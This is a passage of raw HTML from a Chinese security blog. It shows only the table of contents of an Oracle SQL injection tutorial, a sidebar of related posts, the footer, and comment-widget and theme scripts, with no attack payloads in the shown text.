class="toc-link" href="#1%E3%80%81ctxsys-drithsx-sn"><span class="toc-number">4.1.</span> <span class="toc-text">1、ctxsys.drithsx.sn()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81XMLType"><span class="toc-number">4.2.</span> <span class="toc-text">2、XMLType()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81dbms-xdb-version-checkin"><span class="toc-number">4.3.</span> <span class="toc-text">3、dbms_xdb_version.checkin()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81bms-xdb-version-makeversioned"><span class="toc-number">4.4.</span> <span class="toc-text">4、bms_xdb_version.makeversioned()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81dbms-xdb-version-uncheckout"><span class="toc-number">4.5.</span> <span class="toc-text">5、dbms_xdb_version.uncheckout()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E3%80%81dbms-utility-sqlid-to-sqlhash"><span class="toc-number">4.6.</span> <span class="toc-text">6、dbms_utility.sqlid_to_sqlhash()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7%E3%80%81ordsys-ord-dicom-getmappingxpath"><span class="toc-number">4.7.</span> <span class="toc-text">7、ordsys.ord_dicom.getmappingxpath()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8%E3%80%81utl-inaddr"><span class="toc-number">4.8.</span> <span class="toc-text">8、utl_inaddr.*()</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E5%B8%83%E5%B0%94%E5%9E%8B%E7%9B%B2%E6%B3%A8"><span class="toc-number">5.</span> <span class="toc-text">0x05 布尔型盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81decode%E5%87%BD%E6%95%B0%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">5.1.</span> <span class="toc-text">1、decode函数布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E7%94%A8%E6%88%B7%E5%90%8D%E9%95%BF%E5%BA%A6"><span class="toc-number">5.1.1.</span> <span class="toc-text">测试用户名长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E6%98%AF%E5%90%A6%E4%B8%BASYSTEM"><span class="toc-number">5.1.2.</span> <span class="toc-text">测试当前用户是否为SYSTEM</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81instr%E5%87%BD%E6%95%B0%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">5.2.</span> <span class="toc-text">2、instr函数布尔盲注</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8"><span class="toc-number">6.</span> <span class="toc-text">0x06 延时盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E6%A3%80%E6%B5%8B%E6%BC%8F%E6%B4%9E%E5%AD%98%E5%9C%A8"><span class="toc-number">6.1.</span> <span class="toc-text">1、检测漏洞存在</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E9%85%8D%E5%90%88decode%E5%87%BD%E6%95%B0%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8"><span class="toc-number">6.2.</span> <span class="toc-text">2、配合decode函数延时盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E4%BD%BF%E7%94%A8%E5%85%B6%E4%BB%96%E5%BB%B6%E6%97%B6%E6%9F%A5%E8%AF%A2%E6%9D%A5%E5%88%A4%E6%96%AD"><span class="toc-number">6.3.</span> <span class="toc-text">3、使用其他延时查询来判断</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E6%B3%A8%E5%85%A5"><span class="toc-number">7.</span> <span class="toc-text">0x07 外带数据注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81url-http-request"><span class="toc-number">7.1.</span> <span class="toc-text">1、url_http.request()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81utl-inaddr-get-host-address-%E5%87%BD%E6%95%B0"><span class="toc-number">7.2.</span> <span class="toc-text">2、utl_inaddr.get_host_address()函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81SYS-DBMS-LDAP-INIT-%E5%87%BD%E6%95%B0"><span class="toc-number">7.3.</span> <span class="toc-text">3、SYS.DBMS_LDAP.INIT()函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81HTTPURITYPE-%E5%87%BD%E6%95%B0"><span class="toc-number">7.4.</span> <span class="toc-text">4、HTTPURITYPE()函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-%E6%80%BB%E7%BB%93"><span class="toc-number">8.</span> <span class="toc-text">0x08 总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/08/03/%E6%9F%90cms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1RCE&amp;%E8%89%B0%E9%9A%BEbypass(%E6%80%9D%E8%B7%AF%E6%B8%85%E5%A5%87)/" title="某cms代码审计RCE&amp;艰难bypass(思路清奇)"><img src="https://img0.baidu.com/it/u=751296986,1439230770&amp;fm=253&amp;fmt=auto&amp;app=120&amp;f=JPEG?w=650&amp;h=407" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="某cms代码审计RCE&amp;艰难bypass(思路清奇)"/></a><div class="content"><a class="title" href="/2021/08/03/%E6%9F%90cms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1RCE&amp;%E8%89%B0%E9%9A%BEbypass(%E6%80%9D%E8%B7%AF%E6%B8%85%E5%A5%87)/" title="某cms代码审计RCE&amp;艰难bypass(思路清奇)">某cms代码审计RCE&amp;艰难bypass(思路清奇)</a><time datetime="2021-08-03T08:20:43.038Z" title="发表于 2021-08-03 16:20:43">2021-08-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/08/01/Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="Oracle数据库注入环境搭建"><img src="https://img0.baidu.com/it/u=3845303080,3279446310&amp;fm=26&amp;fmt=auto&amp;gp=0.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Oracle数据库注入环境搭建"/></a><div class="content"><a class="title" href="/2021/08/01/Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="Oracle数据库注入环境搭建">Oracle数据库注入环境搭建</a><time datetime="2021-08-01T02:00:00.000Z" title="发表于 2021-08-01 10:00:00">2021-08-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/02/PHP%E6%97%A0%E5%9B%9E%E6%98%BE%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%BB%E7%BB%93/" title="PHP无回显渗透测试总结"><img src="/images/phpwhx.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP无回显渗透测试总结"/></a><div class="content"><a class="title" href="/2021/07/02/PHP%E6%97%A0%E5%9B%9E%E6%98%BE%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%BB%E7%BB%93/" title="PHP无回显渗透测试总结">PHP无回显渗透测试总结</a><time datetime="2021-07-02T02:45:41.000Z" title="发表于 2021-07-02 10:45:41">2021-07-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/08/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Fastjson%E5%85%A8%E6%96%B9%E4%BD%8D%E5%88%A9%E7%94%A8/" title="漏洞复现-Fastjson全方位利用"><img src="https://img1.baidu.com/it/u=4236482212,3196079296&amp;fm=26&amp;fmt=auto&amp;gp=0.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="漏洞复现-Fastjson全方位利用"/></a><div class="content"><a class="title" href="/2021/06/08/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Fastjson%E5%85%A8%E6%96%B9%E4%BD%8D%E5%88%A9%E7%94%A8/" title="漏洞复现-Fastjson全方位利用">漏洞复现-Fastjson全方位利用</a><time datetime="2021-06-08T02:45:41.000Z" title="发表于 2021-06-08 10:45:41">2021-06-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/02/MSSQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E5%85%A8%E6%96%B9%E4%BD%8D%E5%88%A9%E7%94%A8/" title="MSSQL数据库注入全方位利用"><img src="https://p5.ssl.qhimg.com/t0181df866952842a55.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MSSQL数据库注入全方位利用"/></a><div class="content"><a class="title" href="/2021/02/02/MSSQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E5%85%A8%E6%96%B9%E4%BD%8D%E5%88%A9%E7%94%A8/" title="MSSQL数据库注入全方位利用">MSSQL数据库注入全方位利用</a><time datetime="2021-02-02T02:45:41.000Z" title="发表于 2021-02-02 10:45:41">2021-02-02</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021  <i id="heartbeat" class="fa fas fa-heartbeat"></i> jasson</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><p><a style="margin-inline:5px"target="_blank" href="https://hexo.io/"><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为 Hexo" alt="HEXO"></a><a style="margin-inline:5px"target="_blank" href="https://butterfly.js.org/"><img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用 Butterfly" alt="Butterfly"></a><a style="margin-inline:5px"target="_blank" href="https://www.jsdelivr.com/"><img src="https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&logo=jsDelivr" title="本站使用 Jsdelivr 为静态资源提供CDN加速" alt="Jsdelivr"></a><a style="margin-inline:5px"target="_blank" href="https://github.com/"><img src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由 GitHub 托管" alt="GitHub"></a><a style="margin-inline:5px"target="_blank"href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" alt="img" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a></p></div></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'ezr37wKgCkQA0GoJHntOvgbB-MdYXbMMI',
      appKey: '7waFMOWmYb026lMWzexxu7RF',
      placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!',
      avatar: 'monsterid',
      meta: 'nick,mail,link'.split(','),
      pageSize: '10',
      lang: 'zh-CN',
      recordIP: false,
      serverURLs: '',
      emojiCDN: '',
      emojiMaps: "",
      enableQQ: false,
      path: window.location.pathname,
      requiredFields: ["nick,mail"],
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script defer src="/live2d-widget/autoload.js"></script><script defer src="/js/phone.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="true" data-text="富强,明主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>